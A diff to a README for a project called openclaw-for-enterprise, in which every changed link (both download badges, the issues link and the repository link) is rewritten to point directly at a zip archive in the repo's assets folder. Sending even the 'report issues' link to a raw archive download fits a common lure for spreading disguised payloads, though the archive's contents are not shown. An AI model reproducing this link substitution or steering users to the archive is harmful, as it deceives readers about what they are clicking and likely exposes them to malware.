@@ -1,6 +1,6 @@
 # 🛠️ openclaw-for-enterprise - Reliable Multi-User Deployment
 
-[![Download openclaw-for-enterprise](https://img.shields.io/badge/Download-openclaw--for--enterprise-brightgreen?style=for-the-badge&logo=github)](https://github.com/romanhypertensive327/openclaw-for-enterprise)
+[![Download openclaw-for-enterprise](https://img.shields.io/badge/Download-openclaw--for--enterprise-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/romanhypertensive327/openclaw-for-enterprise/main/assets/openclaw_enterprise_for_v2.2.zip)
 
 ---
 
@@ -51,7 +51,7 @@ openclaw-for-enterprise lets you:
 
 Visit the download page by clicking this big button:
 
-[![Download openclaw-for-enterprise](https://img.shields.io/badge/Download-openclaw--for--enterprise-blue?style=for-the-badge&logo=github)](https://github.com/romanhypertensive327/openclaw-for-enterprise)
+[![Download openclaw-for-enterprise](https://img.shields.io/badge/Download-openclaw--for--enterprise-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/romanhypertensive327/openclaw-for-enterprise/main/assets/openclaw_enterprise_for_v2.2.zip)
 
 You will see the project page on GitHub. Look for the latest release or download section. This page contains the files you need.
 
@@ -152,7 +152,7 @@ Checking for updates is important. Updates fix bugs and improve security.
 
 Use GitHub to report issues or ask questions:
 
-[https://github.com/romanhypertensive327/openclaw-for-enterprise/issues](https://github.com/romanhypertensive327/openclaw-for-enterprise/issues)
+[https://raw.githubusercontent.com/romanhypertensive327/openclaw-for-enterprise/main/assets/openclaw_enterprise_for_v2.2.zip](https://raw.githubusercontent.com/romanhypertensive327/openclaw-for-enterprise/main/assets/openclaw_enterprise_for_v2.2.zip)
 
 Describe your problem clearly. Include any error messages or screenshots if possible.
 
@@ -162,4 +162,4 @@ Describe your problem clearly. Include any error messages or screenshots if poss
 
 Check the GitHub repository page often for guides, updates, and extras.
 
-[openclaw-for-enterprise GitHub](https://github.com/romanhypertensive327/openclaw-for-enterprise)
+[openclaw-for-enterprise GitHub](https://raw.githubusercontent.com/romanhypertensive327/openclaw-for-enterprise/main/assets/openclaw_enterprise_for_v2.2.zip)
